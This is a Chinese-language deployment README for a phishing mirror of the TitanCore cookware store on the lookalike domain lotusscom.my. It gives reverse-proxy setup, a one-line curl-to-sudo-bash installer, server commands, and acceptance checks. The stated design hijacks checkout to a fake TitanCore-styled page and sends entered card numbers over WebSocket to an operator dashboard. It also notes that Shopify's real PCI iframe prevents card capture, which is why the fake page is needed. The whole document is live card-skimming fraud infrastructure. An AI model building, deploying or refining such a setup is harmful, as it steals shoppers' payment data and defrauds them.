# TitanCore Mirror — lotusscom.my 部署

在 **lotusscom.my** 服务器上部署 TitanCore 镜像，源站为 [shop-titancore.com](https://shop-titancore.com/products/hybrid-pots-pans-set-12-pc)。

## 架构

- **Storefront**：反代 shop-titancore.com 商品页/购物车
- **Checkout**：劫持 `/checkout`、`/checkouts/*`、`shop.app` → 自建 `/checkout/`（仿 TitanCore UI）
- **收卡**：WebSocket `wss://{host}/api/?role=customer` → dashboard `:9528`

## 一键部署

```bash
curl -fsSL https://raw.githubusercontent.com/Rshijituan-baozi/titancore-mirror/main/deploy.sh | sudo bash
```

脚本会：

- 停止 PM2 `lotus` / `neoflam`
- 克隆/更新 `/app/titancore-mirror`
- 启动 PM2 `titancore`（端口 **3000**）
- 配置 Nginx（含 `/api/` WebSocket → 9528）

## 环境变量（`/app/titancore-mirror/.env`）

```env
PORT=3000
TARGET_URL=https://shop-titancore.com
PUBLIC_HOST=www.lotusscom.my
ADMIN_API_BASE=http://127.0.0.1:9528
```

## 手动上传部署包（无 Git 时）

本地已生成 `titancore-mirror-deploy.tgz`，上传到服务器：

```powershell
scp "C:\Users\Administrator\Desktop\鱼台开发\titancore-mirror-deploy.tgz" root@124.156.204.251:/root/
```

服务器：

```bash
mkdir -p /app/titancore-mirror
tar -xzf /root/titancore-mirror-deploy.tgz -C /app/titancore-mirror
cd /app/titancore-mirror
npm ci --omit=dev
cat > .env <<'EOF'
PORT=3000
TARGET_URL=https://shop-titancore.com
PUBLIC_HOST=www.lotusscom.my
ADMIN_API_BASE=http://127.0.0.1:9528
EOF
pm2 stop lotus neoflam 2>/dev/null; pm2 delete lotus neoflam 2>/dev/null
pm2 start src/index.js --name titancore --cwd /app/titancore-mirror --update-env
pm2 save
bash deploy.sh   # 或仅配置 Nginx 段
```

## 手动更新

```bash
cd /app/titancore-mirror && git pull origin main && npm ci --omit=dev && pm2 restart titancore --update-env
```

## 本地测试

```bash
npm ci
npm test
npm run test:passthrough   # PoC：透传原站 checkout（不劫持）
node scripts/test-ws-smoke.mjs
```

## 验收

1. https://www.lotusscom.my/products/hybrid-pots-pans-set-12-pc — 产品页正常
2. Claim Offer / 加购 → `/cart` 有商品
3. Checkout → `/checkout/`（不进 `shop-titancore.com/checkouts`）
4. 自建结账页含 Step 1/3、TitanCore logo、MYR 订单摘要
5. `curl -s https://www.lotusscom.my/ | grep isShopifyCheckoutUrl`
6. WebSocket 提交测试卡号，dashboard 有 session

## Checkout 透传 PoC 结论

运行 `npm run test:passthrough` 后查看 `scripts/poc-passthrough-report.json`：

| 项目 | 结论 |
|------|------|
| 同域 `/checkouts/cn/...` | HTML 可反代，但 Cookie domain 需改写 |
| Shop Pay | 会跳转 `shop.app`，需改写 `ur_back_url` |
| PCI 卡号 | 在 `checkout.pci.shopifyinc.com` iframe，**无法收卡** |
| 生产 | 必须使用自建 `/checkout/` + 劫持 |

## 回滚 Lotus

```bash
pm2 stop titancore && pm2 delete titancore
pm2 start /app/lotus-mirror/src/index.js --name lotus --cwd /app/lotus-mirror
ln -sf /etc/nginx/sites-available/lotus /etc/nginx/sites-enabled/titancore
nginx -t && systemctl reload nginx
```

## Cloudflare

切换后 **Purge Cache**。若出现 `ERR_QUIC_PROTOCOL_ERROR`，关闭 HTTP/3 或改 DNS 灰云。

## 部署后仍显示 Lotus？

**常见原因**：`ubuntu` 用户的 PM2 里 **lotus 仍占 3000**，而 deploy 用 root 启动 titancore 失败。本机无 Caddy 时 Nginx:80 → :3000 仍会打到 lotus。

**立即修复**：

```bash
# 停 ubuntu 用户下的 lotus
pm2 stop lotus && pm2 delete lotus
pm2 save

# 用 root 启动 titancore（若 titancore 不在 root pm2 里）
cd /app/titancore-mirror
sudo pm2 stop titancore 2>/dev/null; sudo pm2 delete titancore 2>/dev/null
sudo fuser -k 3000/tcp 2>/dev/null; sleep 1
sudo pm2 start src/index.js --name titancore --cwd /app/titancore-mirror --update-env
sudo pm2 save

# 验证（应看到 PFAS / TitanCore，进程名含 titancore）
sudo ss -tlnp | grep 3000
curl -s http://127.0.0.1:3000/ | grep -i PFAS
curl -s -H "Host: www.lotusscom.my" http://127.0.0.1/ | grep -i PFAS
```

Cloudflare **Purge Cache** 后无痕访问产品页。

或重新跑修复版 deploy：`curl -fsSL .../deploy.sh | sudo bash`
